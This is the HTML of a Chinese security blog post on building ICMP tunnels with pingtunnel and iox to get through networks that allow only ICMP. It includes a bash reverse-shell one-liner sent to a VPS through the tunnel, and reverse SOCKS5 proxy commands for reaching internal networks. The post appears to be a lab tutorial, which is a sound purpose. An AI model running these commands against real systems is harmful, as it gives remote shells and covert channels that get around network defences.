@@ -1,0 +1,358 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="icmp 隧道代理搭建0x01 前言两台机器之间，只允许icmp 协议通讯，其他的协议tcp&#x2F;udp 不允许，那么可以考虑利用icmp 隧道进行穿透。 常见的icmp工具： 1234567icmpshPingTunnelicmptunnelpowershell icmp  0x02 pingtunnel反弹Shellpingtunnel地址：https:&#x2F;&#x2F;github.com&#x2F;esrr">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ICMP隧道代理搭建">
+<meta property="og:url" content="https://givemefivw.github.io/2022/10/24/ICMP%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86%E6%90%AD%E5%BB%BA/index.html">
+<meta property="og:site_name" content="斑马线">
+<meta property="og:description" content="icmp 隧道代理搭建0x01 前言两台机器之间，只允许icmp 协议通讯，其他的协议tcp&#x2F;udp 不允许，那么可以考虑利用icmp 隧道进行穿透。 常见的icmp工具： 1234567icmpshPingTunnelicmptunnelpowershell icmp  0x02 pingtunnel反弹Shellpingtunnel地址：https:&#x2F;&#x2F;github.com&#x2F;esrr">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://givemefivw.github.io/2022/10/24/ICMP%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86%E6%90%AD%E5%BB%BA/2022080900.png">
+<meta property="og:image" content="https://givemefivw.github.io/2022/10/24/ICMP%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86%E6%90%AD%E5%BB%BA/2022080901.png">
+<meta property="og:image" content="https://givemefivw.github.io/2022/10/24/ICMP%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86%E6%90%AD%E5%BB%BA/2022080902.png">
+<meta property="og:image" content="https://givemefivw.github.io/2022/10/24/ICMP%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86%E6%90%AD%E5%BB%BA/2022080903.png">
+<meta property="og:image" content="https://givemefivw.github.io/2022/10/24/ICMP%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86%E6%90%AD%E5%BB%BA/2022080904.png">
+<meta property="article:published_time" content="2022-10-24T11:14:14.000Z">
+<meta property="article:modified_time" content="2022-10-24T11:19:14.836Z">
+<meta property="article:author" content="givemefivw">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://givemefivw.github.io/2022/10/24/ICMP%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86%E6%90%AD%E5%BB%BA/2022080900.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>ICMP隧道代理搭建</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://infrequent-lantana-ee5.notion.site/961c291860d74e2ab7c7a32fd3eb08b7?v=466c252155394b439a6c6189f0ec2384">安全文摘</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2022/10/17/Java%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://givemefivw.github.io/2022/10/24/ICMP%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86%E6%90%AD%E5%BB%BA/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://givemefivw.github.io/2022/10/24/ICMP%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86%E6%90%AD%E5%BB%BA/&text=ICMP隧道代理搭建"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://givemefivw.github.io/2022/10/24/ICMP%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86%E6%90%AD%E5%BB%BA/&title=ICMP隧道代理搭建"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://givemefivw.github.io/2022/10/24/ICMP%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86%E6%90%AD%E5%BB%BA/&is_video=false&description=ICMP隧道代理搭建"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ICMP隧道代理搭建&body=Check out this article: https://givemefivw.github.io/2022/10/24/ICMP%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86%E6%90%AD%E5%BB%BA/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://givemefivw.github.io/2022/10/24/ICMP%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86%E6%90%AD%E5%BB%BA/&title=ICMP隧道代理搭建"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://givemefivw.github.io/2022/10/24/ICMP%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86%E6%90%AD%E5%BB%BA/&title=ICMP隧道代理搭建"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://givemefivw.github.io/2022/10/24/ICMP%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86%E6%90%AD%E5%BB%BA/&title=ICMP隧道代理搭建"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://givemefivw.github.io/2022/10/24/ICMP%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86%E6%90%AD%E5%BB%BA/&title=ICMP隧道代理搭建"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://givemefivw.github.io/2022/10/24/ICMP%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86%E6%90%AD%E5%BB%BA/&name=ICMP隧道代理搭建&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://givemefivw.github.io/2022/10/24/ICMP%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86%E6%90%AD%E5%BB%BA/&t=ICMP隧道代理搭建"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#icmp-%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86%E6%90%AD%E5%BB%BA"><span class="toc-number">1.</span> <span class="toc-text">icmp 隧道代理搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">0x01 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-pingtunnel%E5%8F%8D%E5%BC%B9Shell"><span class="toc-number">1.2.</span> <span class="toc-text">0x02 pingtunnel反弹Shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-iox-pingtunnel-%E6%90%AD%E5%BB%BA%E9%9A%A7%E9%81%93"><span class="toc-number">1.3.</span> <span class="toc-text">0x02 iox+pingtunnel 搭建隧道</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3"><span class="toc-number">1.4.</span> <span class="toc-text">0x03 问题解决</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">1.5.</span> <span class="toc-text">参考链接</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        ICMP隧道代理搭建
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">givemefivw</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-10-24T11:14:14.000Z" itemprop="datePublished">2022-10-24</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/">技术文章</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="icmp-隧道代理搭建"><a href="#icmp-隧道代理搭建" class="headerlink" title="icmp 隧道代理搭建"></a>icmp 隧道代理搭建</h1><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>两台机器之间，只允许icmp 协议通讯，其他的协议tcp&#x2F;udp 不允许，那么可以考虑利用icmp 隧道进行穿透。</p>
+<p>常见的icmp工具：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">icmpsh</span><br><span class="line"></span><br><span class="line">PingTunnel</span><br><span class="line"></span><br><span class="line">icmptunnel</span><br><span class="line"></span><br><span class="line">powershell icmp</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x02-pingtunnel反弹Shell"><a href="#0x02-pingtunnel反弹Shell" class="headerlink" title="0x02 pingtunnel反弹Shell"></a>0x02 pingtunnel反弹Shell</h2><p>pingtunnel地址：<a target="_blank" rel="noopener" href="https://github.com/esrrhs/pingtunnel">https://github.com/esrrhs/pingtunnel</a></p>
+<p>在vps端运行开启server端：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./pingtunnel -type server -key 123456</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/10/24/ICMP%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86%E6%90%AD%E5%BB%BA/2022080900.png" alt="2022080900"></p>
+<p>如果想简洁一些可以指定-noprint 1，界面就没有打印信息。</p>
+<p>接着在被控端执行，使其监听本地的5566端口，指定服务端IP为vps，然后将本地端口5566的流量转发到vps的8888 端口，运行之前在vps监听8888端口：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo ./pingtunnel -type client -l :5566 -s vps -t vps:8888 -tcp 1 -</span><br><span class="line">key 123456</span><br></pre></td></tr></table></figure>
+
+<p>可以看到此时服务端和客户端已经有了流量：</p>
+<p><img src="/2022/10/24/ICMP%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86%E6%90%AD%E5%BB%BA/2022080901.png" alt="2022080901"></p>
+<p>此时在被控端运行反弹shell：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/127.0.0.1/5566 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>vps已经得到被控端的Shell：</p>
+<p><img src="/2022/10/24/ICMP%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86%E6%90%AD%E5%BB%BA/2022080902.png" alt="2022080902"></p>
+<h2 id="0x02-iox-pingtunnel-搭建隧道"><a href="#0x02-iox-pingtunnel-搭建隧道" class="headerlink" title="0x02 iox+pingtunnel 搭建隧道"></a>0x02 <strong>iox+pingtunnel 搭建隧道</strong></h2><p>iox地址：<a target="_blank" rel="noopener" href="https://github.com/EddieIvan01/iox">https://github.com/EddieIvan01/iox</a></p>
+<p>服务端运行命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./pingtunnel -type server -key 123456 //开启pingtunnel 服务端</span><br><span class="line"></span><br><span class="line">./iox proxy -l 8898 -l 1080 //开启iox，将8898 收到的请求转发到1080 端口</span><br></pre></td></tr></table></figure>
+
+<p>客户端运行命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./pingtunnel -type client -l 127.0.0.1:9999 -s vps -t vps:8898 -sock5 1 -noprint 1 -nolog 1 -key 123456</span><br><span class="line"></span><br><span class="line">./iox proxy -r 127.0.0.1:9999 //将代理流量转发到9999</span><br></pre></td></tr></table></figure>
+
+<p>接着配置vps socks5代理：socks5:&#x2F;&#x2F;vps:1080，就可以访问内网地址</p>
+<p>这里有一个问题，在隧道搭建时候，客户端提示socks版本不受支持：</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ERROR] [<span class="number">2022</span><span class="number">-08</span><span class="number">-08</span>T17:<span class="number">08</span>:<span class="number">40.611698594</span>+<span class="number">08</span>:<span class="number">00</span>] [client.<span class="keyword">go</span>:<span class="number">715</span>] [github.com/esrrhs/<span class="keyword">go</span>-engine/src/pingtunnel.(*Client).AcceptSock5Conn] socks handshake: socks version not supported</span><br></pre></td></tr></table></figure>
+
+<p>将这个报错查了一下，并没有直接的pingtunnel报错，只有shadowsocks的，说是换用socks5，但运行的时候已经指定sock5为1了。</p>
+<p>后面又尝试了使用ew，但仍然是这个问题，查了很多博客，命令应该是没错的，但是同样的命令其他博客就可以直接连接，有点蛋疼。</p>
+<h2 id="0x03-问题解决"><a href="#0x03-问题解决" class="headerlink" title="0x03 问题解决"></a>0x03 问题解决</h2><p>经过尝试，发现问题出现客户端，重新走一遍流程：</p>
+<p>server端：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo ./pingtunnel -<span class="built_in">type</span> server -key <span class="number">123456</span> //开启pingtunnel 服务端</span><br><span class="line"></span><br><span class="line">sudo ./iox proxy -l <span class="number">8898</span> -l <span class="number">1089</span> //开启iox，将<span class="number">8898</span> 收到的请求转发到<span class="number">1080</span> 端口</span><br></pre></td></tr></table></figure>
+
+<p>client端：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo ./pingtunnel -<span class="built_in">type</span> client -l <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">9999</span> -s vps -t vps:<span class="number">8898</span> -sock5 -<span class="number">1</span> -nolog <span class="number">1</span> -noprint <span class="number">1</span> -key <span class="number">123456</span></span><br><span class="line"></span><br><span class="line">sudo ./iox proxy -r <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">9999</span> //将代理流量转发到<span class="number">9999</span></span><br></pre></td></tr></table></figure>
+
+<p>等待几十秒之后，如果正常，server端的iox会输出以下信息：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[*] Reverse socks5 server handshake ok <span class="keyword">from</span> vps:<span class="number">46604</span> (encrypted: false)</span><br><span class="line">[*] Socks5 server <span class="keyword">is</span> listening on <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">1089</span> (encrypted: false)</span><br></pre></td></tr></table></figure>
+
+<p>client端的iox输出：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[*] Remote socks5 handshake ok (encrypted: false)</span><br></pre></td></tr></table></figure>
+
+<p>此时隧道才算是搭建完毕</p>
+<p>然后浏览器配置socks代理，访问内网：</p>
+<p><img src="/2022/10/24/ICMP%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86%E6%90%AD%E5%BB%BA/2022080903.png"></p>
+<p>实际测试发现连接速度和访问速度都比较慢。</p>
+<p>查看通信流量，可以看到此时访问都是通过本地地址访问：</p>
+<p><img src="/2022/10/24/ICMP%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86%E6%90%AD%E5%BB%BA/2022080904.png"></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://mp.weixin.qq.com/s/OCpcRqwEexpWFa-bo-wu4g</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://infrequent-lantana-ee5.notion.site/961c291860d74e2ab7c7a32fd3eb08b7?v=466c252155394b439a6c6189f0ec2384">安全文摘</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#icmp-%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86%E6%90%AD%E5%BB%BA"><span class="toc-number">1.</span> <span class="toc-text">icmp 隧道代理搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">0x01 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-pingtunnel%E5%8F%8D%E5%BC%B9Shell"><span class="toc-number">1.2.</span> <span class="toc-text">0x02 pingtunnel反弹Shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-iox-pingtunnel-%E6%90%AD%E5%BB%BA%E9%9A%A7%E9%81%93"><span class="toc-number">1.3.</span> <span class="toc-text">0x02 iox+pingtunnel 搭建隧道</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3"><span class="toc-number">1.4.</span> <span class="toc-text">0x03 问题解决</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">1.5.</span> <span class="toc-text">参考链接</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://givemefivw.github.io/2022/10/24/ICMP%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86%E6%90%AD%E5%BB%BA/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://givemefivw.github.io/2022/10/24/ICMP%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86%E6%90%AD%E5%BB%BA/&text=ICMP隧道代理搭建"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://givemefivw.github.io/2022/10/24/ICMP%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86%E6%90%AD%E5%BB%BA/&title=ICMP隧道代理搭建"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://givemefivw.github.io/2022/10/24/ICMP%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86%E6%90%AD%E5%BB%BA/&is_video=false&description=ICMP隧道代理搭建"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ICMP隧道代理搭建&body=Check out this article: https://givemefivw.github.io/2022/10/24/ICMP%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86%E6%90%AD%E5%BB%BA/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://givemefivw.github.io/2022/10/24/ICMP%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86%E6%90%AD%E5%BB%BA/&title=ICMP隧道代理搭建"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://givemefivw.github.io/2022/10/24/ICMP%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86%E6%90%AD%E5%BB%BA/&title=ICMP隧道代理搭建"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://givemefivw.github.io/2022/10/24/ICMP%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86%E6%90%AD%E5%BB%BA/&title=ICMP隧道代理搭建"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://givemefivw.github.io/2022/10/24/ICMP%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86%E6%90%AD%E5%BB%BA/&title=ICMP隧道代理搭建"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://givemefivw.github.io/2022/10/24/ICMP%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86%E6%90%AD%E5%BB%BA/&name=ICMP隧道代理搭建&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://givemefivw.github.io/2022/10/24/ICMP%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86%E6%90%AD%E5%BB%BA/&t=ICMP隧道代理搭建"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020-2022
+    givemefivw
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://infrequent-lantana-ee5.notion.site/961c291860d74e2ab7c7a32fd3eb08b7?v=466c252155394b439a6c6189f0ec2384">安全文摘</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+  
+        <!-- 不蒜子统计 -->
+        <span id="busuanzi_container_site_pv">
+                本站总访问量<span id="busuanzi_value_site_pv"></span>次
+        </span>
+        <span class="post-meta-divider"></span>
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
